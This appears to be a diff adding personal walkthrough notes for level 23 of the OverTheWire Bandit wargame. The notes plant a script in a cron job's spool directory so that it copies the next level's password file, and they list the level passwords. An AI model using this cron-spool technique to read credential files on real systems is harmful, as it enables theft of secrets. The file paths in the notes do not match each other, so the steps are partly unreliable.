@@ -1,0 +1,56 @@
+#Level 23
+
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit23
+
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+#if we ls we do not have anything out of the norm when first logging in
+#let's see if what we did last level can help start us out
+#we should see if we can cd into cron.d
+
+cd /etc/cron.d/
+
+#now we can ls -la and see there is a cronjob_bandit24
+#let's try to cat it
+
+cat cronjob_bandit24
+
+cat /usr/bin/cronjob_bandit24.sh
+
+#it gave us an echo saying this
+# " echo "Executing and deleting all scripts in /var/spool/$myname:"
+#and also gave a script
+#lets see if we can make a tmp file and use the /var/spool/#myname
+
+mkdir /tmp/noclosie
+
+
+#cd into file and lets try to vim
+
+cd /tmp/noclosie
+
+vim derp.sh
+
+#we are going to make a cat for the password to show up in the script
+#when we run it later because the script earlier is going to close before
+#the password shows, so this is our storage
+
+cat /etc/bandit_pass/bandit24 >> /tmp/herpaderp/pass
+
+#need to chmod 777 to make file readable and writeable
+chmod 777 derp.sh
+
+#copying the password to the file
+cp derp.sh /var/spool/bandit24
+
+#we will need to ls to get the file to read run and show in the 'pass' file
+ls
+
+ls
+
+#we see the pass file, lets cat it
+
+cat pass
+
+#password shows up ' UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '
